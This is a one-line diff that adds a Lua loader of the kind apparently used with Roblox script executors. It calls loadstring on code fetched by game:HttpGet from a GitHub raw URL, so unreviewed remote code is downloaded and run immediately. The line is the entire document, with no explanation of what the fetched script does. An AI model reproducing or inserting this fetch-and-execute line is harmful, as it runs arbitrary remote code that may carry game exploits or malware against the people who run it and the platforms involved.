@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CoolDolphim/BTRP-H-/refs/heads/main/BTRPH/Main.lua"))()
